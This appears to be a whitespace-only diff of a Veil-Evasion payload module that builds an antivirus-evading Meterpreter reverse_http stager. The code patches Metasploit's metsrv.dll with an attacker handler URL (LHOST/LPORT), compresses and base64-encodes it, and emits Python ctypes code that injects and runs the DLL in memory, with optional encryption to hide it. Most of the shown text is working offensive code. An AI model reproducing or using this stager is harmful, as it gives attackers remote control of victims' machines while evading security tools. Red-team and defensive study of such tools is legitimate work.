@@ -1,8 +1,8 @@
 """
 
-Reads in metsrv.dll, patches it with appropriate options for a 
-meterpreter reverse_http payload compresses/bas64 encodes it 
-and then builds a python injection wrapper to inject the contained 
+Reads in metsrv.dll, patches it with appropriate options for a
+meterpreter reverse_http payload compresses/bas64 encodes it
+and then builds a python injection wrapper to inject the contained
 meterpreter dll into memory.
 
 Concept and module by @the_grayhound
@@ -19,7 +19,7 @@ from config import veil
 
 
 class Stager:
-    
+
     def __init__(self):
         # required options
         self.shortname = "MeterHTTPContained"
@@ -27,14 +27,14 @@ class Stager:
         self.language = "python"
         self.rating = "Excellent"
         self.extension = "py"
-        
+
         # options we require user interaction for- format is {Option : [Value, Description]]}
         self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
                                 "use_encrypter" : ["N", "Use an available encrypter"],
                                 "LHOST" : ["", "IP of the metasploit handler"],
                                 "LPORT" : ["", "Port of the metasploit handler"]}
-        
-        
+
+
     # helper for the metasploit http checksum algorithm
     def checksum8(self, s):
         # hard rubyish way -> return sum([struct.unpack('<B', ch)[0] for ch in s]) % 0x100
@@ -46,7 +46,7 @@ class Stager:
         if value == "INITW": checkValue = 92 # normal initiation
         if value == "INITJ": checkValue = 88
         else: checkValue = 98 # 'CONN', for existing/"orphaned" connections
-        
+
         chk = string.ascii_letters + string.digits
         for x in xrange(64):
             uri = "".join(random.sample(chk,3))
@@ -54,15 +54,15 @@ class Stager:
             for char in r:
                 if self.checksum8(uri + char) == checkValue:
                     return uri + char
-                    
+
     def generate(self):
-        
+
         metsrvPath = veil.METASPLOIT_PATH + "/data/meterpreter/metsrv.dll"
-        
+
         f = open(metsrvPath, 'rb')
         meterpreterDll = f.read()
         f.close()
-        
+
         # lambda function used for patching the metsvc.dll
         dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]
 
@@ -87,7 +87,7 @@ class Stager:
         urlIndex = meterpreterDll.index("https://" + ("X" * 256))
         urlString = "http://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + randomizer.randomString(16) + "/\x00"
         meterpreterDll = dllReplace(meterpreterDll,urlIndex,urlString)
-        
+
         # replace the expiration timeout with the default value of 300
         expirationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xb64be661))
         expirationTimeout = struct.pack('<I', 604800)
@@ -100,10 +100,10 @@ class Stager:
 
         # compress/base64 encode the dll
         compressedDll = helpers.deflate(meterpreterDll)
-        
+
         # actually build out the payload
         payloadCode = ""
-        
+
         # doing void * cast
         payloadCode += "from ctypes import *\nimport base64,zlib\n"
 
@@ -118,11 +118,11 @@ class Stager:
 
         randVarName = randomizer.randomString()
         randFuncName = randomizer.randomString()
-        
+
         payloadCode += randVarName + " = " + randInflateFuncName + "(\"" + compressedDll + "\")\n"
         payloadCode += randFuncName + " = cast(" + randVarName + ", CFUNCTYPE(c_void_p))\n"
         payloadCode += randFuncName+"()\n"
-        
+
         if self.required_options["use_encrypter"][0].lower() == "y":
             payloadCode = crypters.pyherion(payloadCode)
 
